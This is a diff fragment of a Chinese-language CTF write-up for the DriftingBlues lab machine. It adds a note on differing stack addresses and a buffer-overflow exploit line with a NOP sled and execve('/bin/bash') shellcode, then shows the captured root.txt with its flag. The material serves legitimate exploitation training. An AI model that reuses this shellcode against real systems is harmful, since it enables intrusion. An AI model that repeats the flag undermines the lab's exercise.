@@ -225,7 +225,27 @@ for i in {1..10000}; do (./input $(python -c 'print "A" * 171 + "\xa0\xe4\xff\xb
 ```
 
 在 CUTTER 中分析了二进制文件。发现数组大小为 171，这是我们的偏移值
+
+
+#### 前面的是在kali主机上进行的测试，esp的值和靶机里面的esp的值是不同的,下面才是在靶机中进行提取的
+
 0xbffe48a0:
 ```c
 r $(python -c 'print("A"*171 + "\xa0\xe4\xff\xbf" + "\x90"*64 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80")')
+```
+
+```css
+# cat root.txt
+cat root.txt
+   
+this is the final of driftingblues series. i hope you've learned something from them.
+
+you can always contact me at vault13_escape_service[at]outlook.com for your questions. (mail language: english/turkish)
+
+your root flag:
+
+04D4C1BEC659F1AA15B7AE731CEEDD65
+
+good luck. ( ° ʖ °)
+
 ```
